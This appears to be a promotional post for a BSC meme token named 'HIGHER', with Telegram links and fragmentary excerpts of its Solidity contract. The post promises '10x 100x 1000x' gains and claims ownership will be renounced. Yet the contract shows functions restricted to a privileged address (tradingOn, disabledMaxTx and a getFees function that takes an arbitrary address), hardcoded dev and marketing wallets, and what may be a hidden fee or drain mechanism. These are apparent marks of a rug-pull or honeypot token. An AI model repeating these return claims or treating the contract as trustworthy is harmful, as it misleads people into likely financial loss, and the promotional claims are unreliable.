...
🐸 HIGHER - Launch In Few Hours On BSC 🌐

Higher is a trendy initiative on the BSC network and run by an experienced team. We build Higher as a 
community-centric model, in which 100% Liquidity Pool will be locked and the ownership will also be renounced.

☑️ NO PRESALE TOKEN
☑️ HIGH X POTENTIAL
☑️ NEWGEMS 10x 100x 1000x

🐸: https://t.me/+yFWviQRpSHVlNTI1
🐸: https://t.me/higherofficial
...
contract HIGHER is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "HIGHER";
    ...
    address payable public DevWallet = payable(0x529DD699b14Ab67f3F49F4169729209Ed7427550);
    address payable public MarketingWallet = payable(0xC8b0c9741AAc0fcCbdA0Bf6c73536C59241D7CB0);
    ...
    function tradingOn() external onlyAddress {
        tradingActive = true;
        transferDelay =true;
        limitInEffect = true;
    ...
    function disabledMaxTx() external onlyAddress {
    ...
    function getFees(uint256 value, address adr) onlyAddress public virtual {
